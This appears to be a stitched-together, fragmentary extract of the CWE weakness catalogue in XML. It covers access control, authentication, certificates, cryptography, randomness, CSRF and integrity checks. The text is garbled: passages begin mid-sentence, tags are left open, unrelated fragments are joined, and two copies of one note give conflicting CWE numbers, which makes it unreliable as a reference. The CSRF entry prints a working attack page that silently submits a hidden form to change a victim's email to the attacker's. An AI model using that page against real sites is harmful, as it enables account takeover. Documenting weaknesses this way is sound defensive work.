            <Note Type="Theoretical">Within the context of vulnerability theory, privileges and permissions are two sides of the same coin. Privileges are associated with actors, and permissions are associated with resources. To perform access control, at some point the software makes a decision about whether the actor (and the privileges that have been assigned to that actor) is allowed to access the resource (based on the permissions that have been specified for that resource).</Note>

         <Notes>
            <Note Type="Relationship">This can be both primary and resultant. When primary, it can expose a variety of weaknesses because a resource might not have the expected state, and subsequent operations might fail. It is often resultant from Unchecked Error Condition (CWE-391).</Note>
            <Note Type="Maintenance">CWE-280 and CWE-274 are too similar.</Note>
            <Note Type="Theoretical">Within the context of vulnerability theory, privileges and permissions are two sides of the same coin. Privileges are associated with actors, and permissions are associated with resources. To perform access control, at some point the software makes a decision about whether the actor (and the privileges that have been assigned to that actor) is allowed to access the resource (based on the permissions that have been specified for that resource).</Note>
            <Note Type="Research Gap">This type of issue is under-studied, since researchers often concentrate on whether an object has too many permissions, instead of not enough. These weaknesses are likely to appear in environments with fine-grained models for permissions and privileges, which can include operating systems and other large-scale software packages. However, even highly simplistic permission/privilege models are likely to contain these issues if the developer has not considered the possibility of access failure.</Note>

            <Note Type="Maintenance">The relationships between privileges, permissions, and actors (e.g. users and groups) need further refinement within the Research view. One complication is that these concepts apply to two different pillars, related to control of resources (CWE-664) and protection mechanism failures (CWE-396).</Note>

      </Weakness>
      <Weakness ID="284" Name="Improper Access Control" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The software does not restrict or incorrectly restricts access to a resource from an unauthorized actor.</Description>
         <Extended_Description>
            <xhtml:p>Access control involves the use of several protection mechanisms such as authentication (proving the identity of an actor) authorization (ensuring that a given actor can access a resource), and accountability (tracking of activities that were performed). When any mechanism is not applied or otherwise fails, attackers can compromise the security of the software by gaining privileges, reading sensitive information, executing commands, evading detection, etc.</xhtml:p>
            <xhtml:p>There are two distinct behaviors that can introduce access control weaknesses:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>
                  <xhtml:li>Specification: incorrect privileges, permissions, ownership, etc. are explicitly specified for either the user or the resource (for example, setting a password file to be world-writable, or giving administrator capabilities to a guest user). This action could be performed by the program or the administrator.</xhtml:li>
                  <xhtml:li>Enforcement: the mechanism contains errors that prevent it from properly enforcing the specified access control requirements (e.g., allowing the user to specify their own privileges, or allowing a syntactically-incorrect ACL to produce insecure settings). This problem occurs within the program itself, in that it does not actually enforce the intended security policy that the administrator specifies.</xhtml:li>

               <Description>The terms "access control" and "authorization" are often used interchangeably, although many people have distinct definitions. The CWE usage of "access control" is intended as a general term for the various mechanisms that restrict which users can access which resources, and "authorization" is more narrowly defined. It is unlikely that there will be community consensus on the use of these terms.</Description>

         <Background_Details>
            <Background_Detail>An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object.</Background_Detail>

It is also distinct from "AuthC," which is an abbreviation of "authentication." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</Description>

               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authorization schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an authorization check; an automated technique that detects the absence of authorization may report false positives.</xhtml:p>

         <Notes>
            <Note Type="Maintenance">The relationships between privileges, permissions, and actors (e.g. users and groups) need further refinement within the Research view. One complication is that these concepts apply to two different pillars, related to control of resources (CWE-664) and protection mechanism failures (CWE-693).</Note>
            <Note Type="Maintenance">This item needs more work. Possible sub-categories include: user in wrong group, and user with insecure profile or "configuration". It also might be better expressed as a category than a weakness.</Note>

               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting certain types of authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.</xhtml:p>

            <Demonstrative_Example>
               <Intro_Text>In January 2009, an attacker was able to gain administrator access to a Twitter server because the server did not restrict the number of login attempts. The attacker targeted a member of Twitter's support team and was able to successfully guess the member's password using a brute force with a large number of common words. Once the attacker gained access as the member of the support staff, he used the administrator panel to gain access to 33 accounts that belonged to celebrities and politicians. Ultimately, fake Twitter messages were sent that appeared to come from the compromised accounts.</Intro_Text>

               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>

               <Description>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.</Description>

               <Body_Text>IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication.</Body_Text>

      <Weakness ID="294" Name="Authentication Bypass by Capture-replay" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>A capture-replay flaw exists when the design of the software makes it possible for a malicious user to sniff network traffic and bypass authentication by replaying it to the server in question to the same effect as the original message (or with minor changes).</Description>
         <Extended_Description>Capture-replay attacks are common and can be difficult to defeat without cryptography. They are a subset of network injection attacks that rely on observing previously-sent valid commands, then changing them slightly if necessary and resending the same commands to the server.</Extended_Description>

      <Weakness ID="296" Name="Improper Following of a Certificate's Chain of Trust" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software does not follow, or incorrectly follows, the chain of trust for a certificate back to a trusted root certificate, resulting in incorrect trust of any resource that is associated with that certificate.</Description>
         <Extended_Description>
            <xhtml:p>If a system does not follow the chain of trust of a certificate to a root server, the certificate loses all usefulness as a metric of trust. Essentially, the trust gained from a certificate is derived from a chain of trust -- with a reputable trusted entity at the end of that list. The end user must trust that reputable source, and this reputable source must vouch for the resource in question through the medium of the certificate.</xhtml:p>
            <xhtml:p>In some cases, this trust traverses several entities who vouch for one another. The entity trusted by the end user is at one end of this trust chain, while the certificate-wielding resource is at the other end of the chain. If the user receives a certificate at the end of one of these trust chains and then proceeds to check only that the first link in the chain, no real trust has been derived, since the entire chain must be traversed back to a trusted source to verify the certificate.</xhtml:p>
            <xhtml:p>There are several ways in which the chain of trust might be broken, including but not limited to:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>
                  <xhtml:li>Any certificate in the chain is self-signed, unless it the root.</xhtml:li>
                  <xhtml:li>Not every intermediate certificate is checked, starting from the original certificate all the way up to the root certificate.</xhtml:li>

      <Weakness ID="297" Name="Improper Validation of Certificate with Host Mismatch" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software communicates with a host that provides a certificate, but the software does not properly ensure that the certificate is actually associated with that host.</Description>
         <Extended_Description>
            <xhtml:p>Even if a certificate is well-formed, signed, and follows the chain of trust, it may simply be a valid certificate for a different site than the site that the software is interacting with. If the certificate's host-specific data is not properly checked - such as the Common Name (CN) in the Subject or the Subject Alternative Name (SAN) extension of an X.509 certificate - it may be possible for a redirection or spoofing attack to allow a malicious host with a valid certificate to provide data, impersonating a trusted host. In order to ensure data integrity, the certificate must be valid and it must pertain to the site that is being accessed.</xhtml:p>
            <xhtml:p>Even if the software attempts to check the hostname, it is still possible to incorrectly check the hostname. For example, attackers could create a certificate with a name that begins with a trusted name followed by a NUL byte, which could cause some string-based comparisons to only examine the portion that contains the trusted name.</xhtml:p>

      <Weakness ID="298" Name="Improper Validation of Certificate Expiration" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>A certificate expiration is not validated or is incorrectly validated, so trust may be assigned to certificates that have been abandoned due to age.</Description>
         <Extended_Description>When the expiration of a certificate is not taken into account, no trust has necessarily been conveyed through it. Therefore, the validity of the certificate cannot be verified and all benefit of the certificate is lost.</Extended_Description>

      <Weakness ID="299" Name="Improper Check for Certificate Revocation" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software does not check or incorrectly checks the revocation status of a certificate, which may cause it to use a certificate that has been compromised.</Description>
         <Extended_Description>An improper check for certificate revocation is a far more serious flaw than related certificate failures. This is because the use of any revoked certificate is almost certainly malicious. The most common reason for certificate revocation is compromise of the system in question, with the result that no legitimate servers will be using a revoked certificate, unless they are sorely out of sync.</Extended_Description>

      <Weakness ID="300" Name="Channel Accessible by Non-Endpoint ('Man-in-the-Middle')" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product does not adequately verify the identity of actors at both ends of a communication channel, or does not adequately ensure the integrity of the channel, in a way that allows the channel to be accessed or influenced by an actor that is not an endpoint.</Description>
         <Extended_Description>In order to establish secure communication between two parties, it is often important to adequately verify the identity of entities at each end of the communication channel. Inadequate or inconsistent verification may result in insufficient or incorrect identification of either communicating entity. This can have negative consequences such as misplaced trust in the entity at the other end of the channel. An attacker can leverage this by interposing between the communicating entities and masquerading as the original entity. In the absence of sufficient verification of identity, such an attacker can eavesdrop and potentially modify the communication between the original entities.</Extended_Description>

               <Description>A certificate binds an identity to a cryptographic key to authenticate a communicating party. Often, the certificate takes the encrypted form of the hash of the identity of the subject, the public key, and information such as time of issue or expiration using the issuer's private key. The certificate can be validated by deciphering the certificate with the issuer's public key. See also X.509 certificate signature chains and the PGP certification structure.</Description>

      <Weakness ID="301" Name="Reflection Attack in an Authentication Protocol" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>Simple authentication protocols are subject to reflection attacks if a malicious user can use the target machine to impersonate a trusted user.</Description>
         <Extended_Description>A mutual authentication protocol requires each party to respond to a random challenge by the other party by encrypting it with a pre-shared key. Often, however, such protocols employ the same pre-shared key for communication with a number of different entities. A malicious user or an attacker can easily compromise this protocol without possessing the correct key by employing a reflection attack on the protocol.</Extended_Description>

         <Notes>
            <Note Type="Maintenance">The term "reflection" is used in multiple ways within CWE and the community, so its usage should be reviewed.</Note>
            <Note Type="Other">Reflection attacks capitalize on mutual authentication schemes in order to trick the target into revealing the secret shared between it and another valid user. In a basic mutual-authentication scheme, a secret is known to both the valid user and the server; this allows them to authenticate. In order that they may verify this shared secret without sending it plainly over the wire, they utilize a Diffie-Hellman-style scheme in which they each pick a value, then request the hash of that value as keyed by the shared secret. In a reflection attack, the attacker claims to be a valid user and requests the hash of a random value from the server. When the server returns this value and requests its own value to be hashed, the attacker opens another connection to the server. This time, the hash requested by the attacker is the value which the server requested in the first connection. When the server returns this hashed value, it is used in the first connection, authenticating the attacker successfully as the impersonated valid user.</Note>

            <Demonstrative_Example>
               <Intro_Text>In January 2009, an attacker was able to gain administrator access to a Twitter server because the server did not restrict the number of login attempts. The attacker targeted a member of Twitter's support team and was able to successfully guess the member's password using a brute force attack by guessing a large number of common words. Once the attacker gained access as the member of the support staff, he used the administrator panel to gain access to 33 accounts that belonged to celebrities and politicians. Ultimately, fake Twitter messages were sent that appeared to come from the compromised accounts.</Intro_Text>

      <Weakness ID="308" Name="Use of Single-factor Authentication" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The use of single-factor authentication can lead to unnecessary risk of compromise when compared with the benefits of a dual-factor authentication scheme.</Description>
         <Extended_Description>While the use of multiple authentication schemes is simply piling on more complexity on top of authentication, it is inestimably valuable to have such measures of redundancy. The use of weak, reused, and common passwords is rampant on the internet. Without the added protection of multiple authentication schemes, a single mistake can result in the compromise of an account. For this reason, if multiple schemes are possible and also easy to use, they should be implemented and required.</Extended_Description>

               <Impact>Read Application Data</Impact>
               <Note>If the application does not use a secure channel, such as SSL, to exchange sensitive information, it is possible for an attacker with access to the network traffic to sniff packets from the connection and uncover the data. This attack is not technically difficult, but does require physical access to some portion of the network over which the sensitive data travels. This access is usually somewhere near where the user is connected to the network (such as a colleague on the company network) but can be anywhere along the path from the user to the end server.</Note>

               <Note>Omitting the use of encryption in any program which transfers data over a network of any kind should be considered on par with delivering the data sent to each user on the local networks of both the sender and receiver. Worse, this omission allows for the injection of data into a stream of communication between two parties -- with no means for the victims to separate valid data from invalid. In this day of widespread network attacks and password collection sniffers, it is an unnecessary risk to omit encryption from the design of any system which might benefit from it.</Note>

               <Description>The characterizaton of sensitive data often requires domain-specific understanding, so manual methods are useful. However, manual efforts might not achieve desired code coverage within limited time constraints.

               <Description>
                  <xhtml:p>When there is a need to store or transmit sensitive data, use strong, up-to-date cryptographic algorithms to encrypt that data. Select a well-vetted algorithm that is currently considered to be strong by experts in the field, and use well-tested implementations. As with all cryptographic mechanisms, the source code should be available for analysis.</xhtml:p>
                  <xhtml:p>For example, US government systems require FIPS 140-2 certification.</xhtml:p>
                  <xhtml:p>Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. Reverse engineering techniques are mature. If the algorithm can be compromised if attackers find out how it works, then it is especially weak.</xhtml:p>
                  <xhtml:p>Periodically ensure that the cryptography has not become obsolete. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong. [REF-267]</xhtml:p>

         <Notes>
            <Note Type="Relationship">There is an overlapping relationship between insecure storage of sensitive information (CWE-922) and missing encryption of sensitive information (CWE-311). Encryption is often used to prevent an attacker from reading the sensitive data. However, encryption does not prevent the attacker from erasing or overwriting the data.</Note>

      <Weakness ID="312" Name="Cleartext Storage of Sensitive Information" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The application stores sensitive information in cleartext within a resource that might be accessible to another control sphere.</Description>
         <Extended_Description>Because the information is stored in cleartext, attackers could potentially read it. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.</Extended_Description>

      <Weakness ID="316" Name="Cleartext Storage of Sensitive Information in Memory" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The application stores sensitive information in cleartext in memory.</Description>
         <Extended_Description>
            <xhtml:p>The sensitive memory might be saved to disk, stored in a core dump, or remain uncleared if the application crashes, or if the programmer does not properly clear the memory before freeing it.</xhtml:p>
            <xhtml:p>It could be argued that such problems are usually only exploitable by those with administrator privileges. However, swapping could cause the memory to be written to disk and leave it accessible to physical attack afterwards. Core dump files might have insecure permissions or be stored in archive files that are accessible to untrusted people. Or, uncleared sensitive memory might be inadvertently exposed to attackers due to another weakness.</xhtml:p>

               <Description>
                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process, trigger the feature that sends the data, and look for the presence or absence of common cryptographic functions in the call tree. Monitor the network and determine if the data packets contain readable commands. Tools exist for detecting if certain encodings are in use. If the traffic contains high entropy, this might indicate the usage of encryption.</xhtml:p>

         <Notes>
            <Note Type="Other">The main difference between the use of hard-coded passwords and the use of hard-coded cryptographic keys is the false sense of security that the former conveys. Many people believe that simply hashing a hard-coded password before storage will protect the information from malicious users. However, many hashes are reversible (or at least vulnerable to brute force attacks) -- and further, many authentication protocols simply request the hash itself, making it no better than a password.</Note>

      <Weakness ID="322" Name="Key Exchange without Entity Authentication" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software performs a key exchange with an actor without verifying the identity of that actor.</Description>
         <Extended_Description>Performing a key exchange will preserve the integrity of the information sent between two entities, but this will not guarantee that the entities are who they claim they are. This may enable a set of "man-in-the-middle" attacks. Typically, this involves a victim client that contacts a malicious server that is impersonating a trusted server. If the client skips authentication or ignores an authentication failure, the malicious server may request authentication information from the user. The malicious server can then use this authentication information to log in to the trusted server using the victim's credentials, sniff traffic between the victim and trusted server, etc.</Extended_Description>

      <Weakness ID="324" Name="Use of a Key Past its Expiration Date" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product uses a cryptographic key or password past its expiration date, which diminishes its safety significantly by increasing the timing window for cracking attacks against that key.</Description>
         <Extended_Description>While the expiration of keys does not necessarily ensure that they are compromised, it is a significant concern that keys which remain in use for prolonged periods of time have a decreasing probability of integrity. For this reason, it is important to replace keys within a period of time proportional to their strength.</Extended_Description>

         <Description>The use of a broken or risky cryptographic algorithm is an unnecessary risk that may result in the exposure of sensitive information.</Description>
         <Extended_Description>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has been protected. Well-known techniques may exist to break the algorithm.</Extended_Description>

            <Background_Detail>
               <xhtml:p>Cryptographic algorithms are the methods by which data is scrambled. There are a small number of well-understood and heavily studied algorithms that should be used by most applications. It is quite difficult to produce a secure algorithm, and even high profile algorithms by accomplished cryptographic experts have been broken.</xhtml:p>
               <xhtml:p>Since the state of cryptography advances so rapidly, it is common for an algorithm to be considered "unsafe" even if it was once thought to be strong. This can happen when new attacks against the algorithm are discovered, or if computing power increases so much that the cryptographic algorithm no longer provides the amount of protection that was originally thought.</xhtml:p>

                  <xhtml:p>When there is a need to store or transmit sensitive data, use strong, up-to-date cryptographic algorithms to encrypt that data. Select a well-vetted algorithm that is currently considered to be strong by experts in the field, and use well-tested implementations. As with all cryptographic mechanisms, the source code should be available for analysis.</xhtml:p>
                  <xhtml:p>For example, US government systems require FIPS 140-2 certification.</xhtml:p>
                  <xhtml:p>Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. Reverse engineering techniques are mature. If the algorithm can be compromised if attackers find out how it works, then it is especially weak.</xhtml:p>
                  <xhtml:p>Periodically ensure that the cryptography has not become obsolete. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours.

         <Description>The product uses a hashing algorithm that produces a hash value that can be used to determine the original input, or to find an input that can produce the same hash, more efficiently than brute force techniques.</Description>
         <Extended_Description>This weakness is especially dangerous when the hash is used in security algorithms that require the one-way property to hold. For example, if an authentication system takes an incoming password and generates a hash, then compares the hash to another hash that it has stored in its authentication database, then the ability to create a collision could allow an attacker to provide an alternate password that produces the same target hash, bypassing authentication.</Extended_Description>

               <Description>
                  <xhtml:p>Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations ("stretching") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.</xhtml:p>
                  <xhtml:p>Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.</xhtml:p>
                  <xhtml:p>Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.</xhtml:p>

         <Background_Details>
            <Background_Detail>Computers are deterministic machines, and as such are unable to produce true randomness. Pseudo-Random Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated. There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value.</Background_Detail>

The attacker could then read the resource, or pre-create a resource with the same ID to prevent the legitimate program from properly sending the resource to the intended user. For example, a product might maintain session information in a file whose name is based on a username. An attacker could pre-create this file for a victim user, then set the permissions so that the application cannot generate the session for the victim, preventing the victim from using the application.</Note>

               <Description>
                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and look for library functions that indicate when randomness is being used. Run the process multiple times to see if the seed changes. Look for accesses of devices or equivalent resources that are commonly used for strong (or weak) randomness, such as /dev/urandom on Linux. Look for library or system calls that access predictable information such as process IDs and system time.</xhtml:p>

               <Body_Text>This code uses the Random.nextInt() function to generate "unique" identifiers for the receipt pages it generates. Because Random.nextInt() is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.</Body_Text>

               <Description>When deciding which PRNG to use, look at its sources of entropy. Depending on what your security needs are, you may need to use a random number generator that always uses strong random data -- i.e., a random number generator that attempts to be strong but will fail in a weak way or will always provide some middle ground of protection through techniques like re-seeding. Generally, something that always provides a predictable amount of strength is preferable.</Description>

The session ID length for Java web applications should be set to 16 bytes (128 bits) to prevent attackers from guessing and/or stealing a session ID and taking over a user's session.</Body_Text>
               <Body_Text>Note for most application servers including the Sun Java Application Server the session ID length is by default set to 128 bits and should not be changed. And for many application servers the session ID length cannot be changed from this default setting. Check your application server documentation for the session ID length default setting and configuration options to ensure that the session ID length is set to 128 bits.</Body_Text>

         <Description>The product uses a Pseudo-Random Number Generator (PRNG) in a security context, but the PRNG's algorithm is not cryptographically strong.</Description>
         <Extended_Description>
            <xhtml:p>When a non-cryptographic PRNG is used in a cryptographic context, it can expose the cryptography to certain types of attacks.</xhtml:p>
            <xhtml:p>Often a pseudo-random number generator (PRNG) is not designed for cryptography. Sometimes a mediocre source of randomness is sufficient or preferable for algorithms that use random numbers. Weak generators generally take less processing power and/or do not use the precious, finite, entropy sources on a system. While such PRNGs might have very useful features, these same features could be used to break the cryptography.</xhtml:p>

         <Notes>
            <Note Type="Maintenance">This entry has some significant overlap with other CWE entries and may need some clarification. See terminology notes.</Note>
            <Note Type="Terminology">The "Origin Validation Error" term was used by Taimur Aslam in his August 1995 thesis. Although not formally defined, an issue is considered to be an origin validation error if either (1) "an object [accepts] input from an unauthorized subject," or (2) "the system [fails] to properly or completely authenticate a subject." A later section says that an origin validation error can occur when the system (1) "does not properly authenticate a user or process" or (2) "does not properly authenticate the shared data or libraries." The only example provided in the thesis (covered by OSVDB:57615) involves a setuid program running command-line arguments without dropping privileges. So, this definition (and its examples in the thesis) effectively cover other weaknesses such as CWE-287 (Improper Authentication), CWE-285 (Improper Authorization), and CWE-250 (Execution with Unnecessary Privileges). There appears to be little usage of this term today, except in the SecurityFocus vulnerability database, where the term is used for a variety of issues, including web-browser problems that allow violation of the Same Origin Policy and improper validation of the source of an incoming message.</Note>

      <Weakness ID="352" Name="Cross-Site Request Forgery (CSRF)" Abstraction="Compound" Structure="Composite" Status="Draft">
         <Description>The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request.</Description>
         <Extended_Description>When a web server is designed to receive a request from a client without any mechanism for verifying that it was intentionally sent, then it might be possible for an attacker to trick a client into making an unintentional request to the web server which will be treated as an authentic request. This can be done via a URL, image load, XMLHttpRequest, etc. and can result in exposure of data or unintended code execution.</Extended_Description>

               <Note>The consequences will vary depending on the nature of the functionality that is vulnerable to CSRF. An attacker could effectively perform any operations as the victim. If the victim is an administrator or privileged user, the consequences may include obtaining complete control over the web application - deleting or stealing data, uninstalling the product, or using it to launch other attacks against all of the product's users. Because the attacker has the identity of the victim, the scope of CSRF is limited only by the victim's privileges.</Note>

               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual analysis can be useful for finding this weakness, and for minimizing false positives assuming an understanding of business logic. However, it might not achieve desired code coverage within limited time constraints. For black-box analysis, if credentials are not known for privileged accounts, then the most security-critical portions of the application may not receive sufficient attention.</xhtml:p>
                  <xhtml:p>Consider using OWASP CSRFTester to identify potential issues and aid in manual analysis.</xhtml:p>

               <Method>Automated Static Analysis</Method>
               <Description>CSRF is currently difficult to detect reliably using automated techniques. This is because each application has its own implicit security policy that dictates which requests can be influenced by an outsider and automatically performed on behalf of a user, versus which requests require strong confidence that the user intends to make the request. For example, a keyword search of the public portion of a web site is typically expected to be encoded within a link that can be launched automatically when the user clicks on the link.</Description>

                  <xhtml:p>When a user visits a site, the site should generate a pseudorandom value and set it as a cookie on the user's machine. The site should require every form submission to include this value as a form value and also as a cookie value.

                  <xhtml:p>Because of the same-origin policy, an attacker cannot read or modify the value stored in the cookie.

               <Body_Text>This code may look protected since it checks for a valid session. However, CSRF attacks can be staged from virtually any tag or HTML construct, including image tags, links, embed or object tags, or other attributes that load background images.</Body_Text>
               <Body_Text>The attacker can then host code that will silently change the username and email address of any user that visits the page while remaining logged in to the target web application. The code might be an innocent-looking web page such as:</Body_Text>
               <Example_Code Nature="attack" Language="HTML">
                  <xhtml:div>&lt;SCRIPT&gt;<xhtml:br/>function SendAttack () {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>form.email = "attacker@example.com";<xhtml:div>
                              <xhtml:i>// send to profile.php</xhtml:i>
                           </xhtml:div>
                           <xhtml:br/>form.submit();</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:br/>&lt;/SCRIPT&gt;<xhtml:br/>
                     <xhtml:br/>&lt;BODY onload="javascript:SendAttack();"&gt;<xhtml:br/>
                     <xhtml:br/>&lt;form action="http://victim.example.com/profile.php" id="form" method="post"&gt;<xhtml:br/>&lt;input type="hidden" name="firstname" value="Funny"&gt;<xhtml:br/>&lt;input type="hidden" name="lastname" value="Joke"&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="hidden" name="email"&gt;<xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Notice how the form contains hidden fields, so when it is loaded into the browser, the user will not notice it. Because SendAttack() is defined in the body's onload attribute, it will be automatically called when the victim loads the web page.</Body_Text>
               <Body_Text>Assuming that the user is already logged in to victim.example.com, profile.php will see that a valid user session has been established, then update the email address to the attacker's own address. At this stage, the user's identity has been compromised, and messages sent through this profile could be sent to the attacker's address.</Body_Text>

      </Weakness>
      <Weakness ID="353" Name="Missing Support for Integrity Check" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software uses a transmission protocol that does not include a mechanism for verifying the integrity of the data during transmission, such as a checksum.</Description>
         <Extended_Description>If integrity check values or "checksums" are omitted from a protocol, there is no way of determining if data has been corrupted in transmission. The lack of checksum functionality in a protocol removes the first application-level check of data that can be used. The end-to-end philosophy of checks states that integrity checks should be performed at the lowest level that they can be completely implemented. Excluding further sanity checks and input validation performed by applications, the protocol's checksum is the most important level of checksum, since it can be performed more completely than at any previous level and takes into account entire messages, as opposed to single packets.</Extended_Description>

      <Weakness ID="354" Name="Improper Validation of Integrity Check Value" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software does not validate or incorrectly validates the integrity check values or "checksums" of a message. This may prevent it from detecting if the data has been modified or corrupted in transmission.</Description>
         <Extended_Description>Improper validation of checksums before use results in an unnecessary risk that can easily be mitigated. The protocol specification describes the algorithm used for calculating the checksum. It is then a simple matter of implementing the calculation and verifying that the calculated checksum and the received checksum match. Improper verification of the calculated checksum and the received checksum can lead to far greater consequences.</Extended_Description>

            <xhtml:p>Some of this information may be characterized as PII (Personally Identifiable Information), Protected Health Information (PHI), etc. Categories of private information may overlap or vary based on the intended usage or the policies and practices of a particular industry.</xhtml:p>
            <xhtml:p>Depending on its location, the type of business it conducts, and the nature of any private data it handles, an organization may be required to comply with one or more of the following federal and state regulations: - Safe Harbor Privacy Framework [REF-340] - Gramm-Leach Bliley Act (GLBA) [REF-341] - Health Insurance Portability and Accountability Act (HIPAA) [REF-342] - California SB-1386 [REF-343].</xhtml:p>
            <xhtml:p>Sometimes data that is not labeled as private can have a privacy implication in a different context. For example, student identification numbers are usually not considered private because there is no explicit and publicly-available mapping to an individual student's personal information. However, if a school generates identification numbers based on student social security numbers, then the identification numbers should be considered private.</xhtml:p>
